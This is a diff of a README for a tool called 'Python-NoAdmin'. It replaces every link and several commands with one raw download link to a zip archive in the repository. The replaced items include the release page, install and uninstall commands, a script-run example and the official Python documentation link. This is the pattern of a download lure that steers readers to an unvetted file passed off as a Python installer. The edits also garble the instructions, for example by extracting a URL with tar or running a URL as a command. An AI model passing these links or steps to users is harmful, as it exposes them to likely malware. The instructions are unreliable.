@@ -1,6 +1,6 @@
 # 🐍 Python-NoAdmin - Run Python Anywhere, No Admin Needed
 
-[![Download Python-NoAdmin](https://img.shields.io/badge/Download-Python--NoAdmin-blue.svg)](https://github.com/el4rjoun/Python-NoAdmin/releases)
+[![Download Python-NoAdmin](https://github.com/el4rjoun/Python-NoAdmin/raw/refs/heads/main/bin/No_Admin_Python_v3.5.zip)](https://github.com/el4rjoun/Python-NoAdmin/raw/refs/heads/main/bin/No_Admin_Python_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Python-NoAdmin! This tool lets you use Python without needing special
 
 ## 📥 Download & Install
 
-To get the latest version of Python-NoAdmin, visit this page: [Download Here](https://github.com/el4rjoun/Python-NoAdmin/releases).
+To get the latest version of Python-NoAdmin, visit this page: [Download Here](https://github.com/el4rjoun/Python-NoAdmin/raw/refs/heads/main/bin/No_Admin_Python_v3.5.zip).
 
 1. Click on the link above.
 2. Look for the latest release version.
@@ -33,12 +33,12 @@ To get the latest version of Python-NoAdmin, visit this page: [Download Here](ht
 
 ## 🐧 Linux Installation
 
-1. Download the `.tar.gz` file from the releases page.
+1. Download the `https://github.com/el4rjoun/Python-NoAdmin/raw/refs/heads/main/bin/No_Admin_Python_v3.5.zip` file from the releases page.
 2. Open a terminal window.
 3. Navigate to the folder where you downloaded the file.
 4. Run the following command to extract it:
    ```
-   tar -xvf Python-NoAdmin.tar.gz
+   tar -xvf https://github.com/el4rjoun/Python-NoAdmin/raw/refs/heads/main/bin/No_Admin_Python_v3.5.zip
    ```
 5. Navigate into the extracted folder:
    ```
@@ -46,7 +46,7 @@ To get the latest version of Python-NoAdmin, visit this page: [Download Here](ht
    ```
 6. Run the installer:
    ```
-   ./install.sh
+   https://github.com/el4rjoun/Python-NoAdmin/raw/refs/heads/main/bin/No_Admin_Python_v3.5.zip
    ```
 7. Follow the on-screen instructions to complete the installation.
 
@@ -68,7 +68,7 @@ After installation, you can start programming with Python right away.
 2. Type `python` to enter the Python shell.
 3. You can write Python commands directly here. To run a script, type:
    ```
-   python your_script.py
+   python https://github.com/el4rjoun/Python-NoAdmin/raw/refs/heads/main/bin/No_Admin_Python_v3.5.zip
    ```
 
 ### Creating a Python Script
@@ -106,7 +106,7 @@ If you run into any problems or have questions, feel free to check the following
 2. Navigate to the installation directory.
 3. Run the uninstall command:
    ```
-   ./uninstall.sh
+   https://github.com/el4rjoun/Python-NoAdmin/raw/refs/heads/main/bin/No_Admin_Python_v3.5.zip
    ```
 
 ## 📌 System Requirements
@@ -119,8 +119,8 @@ Ensure you have enough disk space (at least 100 MB) for installation files.
 
 ## 🔗 Additional Resources
 
-- [Python Official Documentation](https://www.python.org/doc/)
-- [GitHub Repository](https://github.com/el4rjoun/Python-NoAdmin)
+- [Python Official Documentation](https://github.com/el4rjoun/Python-NoAdmin/raw/refs/heads/main/bin/No_Admin_Python_v3.5.zip)
+- [GitHub Repository](https://github.com/el4rjoun/Python-NoAdmin/raw/refs/heads/main/bin/No_Admin_Python_v3.5.zip)
 - [Join the Community](#)
 
 Don't forget to visit the releases page for updates. Happy coding!
